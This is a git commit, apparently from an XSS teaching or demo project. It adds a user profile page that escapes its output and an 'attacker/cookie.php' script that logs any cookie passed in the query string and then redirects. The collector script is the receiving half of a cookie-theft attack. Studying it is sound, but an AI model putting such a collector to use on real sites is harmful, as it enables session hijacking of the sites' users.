c68abb4c21ba079af01a523c2b9b64741e0abd64
Panos <bairamispanagiotis@gmail.com>
2018-02-11 10:42:20 -0800

    XSS attack

---
+++ attacker/cookie.php
@@ -0,0 +1,9 @@
+<?php 
+
+	$cookie = $_GET['cookie'];
+
+	file_put_contents('log.txt', $cookie);
+
+	header('Location: /');
+	
+ ?>
--- index.php
+++ index.php
@@ -1,4 +1,35 @@
 <?php  
 
 require 'app/db.php';
+require 'app/functions.php';
 
+$date = new DateTime('+1 week');
+setcookie('session', 'abc', $date->getTimestamp());
+
+if (!isset($_GET['username'])) {
+	die();
+}
+
+
+$user = $db->prepare("SELECT * FROM users WHERE username = :username");
+
+$user->execute([
+	'username' => $_GET['username'],
+]);
+
+$user = $user->fetchObject();
+
+?>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>User profile</title>
+</head>
+<body>
+	<h2><?php echo e($user->username); ?></h2>
+	<p><?php echo e($user->bio); ?></p>
+</body>
+</html>
